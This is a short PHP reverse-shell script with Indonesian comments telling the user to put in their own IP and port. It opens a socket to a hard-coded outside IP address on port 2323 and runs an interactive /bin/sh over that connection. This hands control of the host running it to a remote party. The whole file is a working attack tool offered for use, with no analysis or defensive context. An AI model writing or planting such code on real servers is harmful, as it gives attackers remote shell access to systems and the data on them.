<?php
// Reverse Shell PHP
$ip = '216.17.94.185'; // Ganti dengan IP Anda
$port = 2323; // Ganti dengan port Anda

$sock = fsockopen($ip, $port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
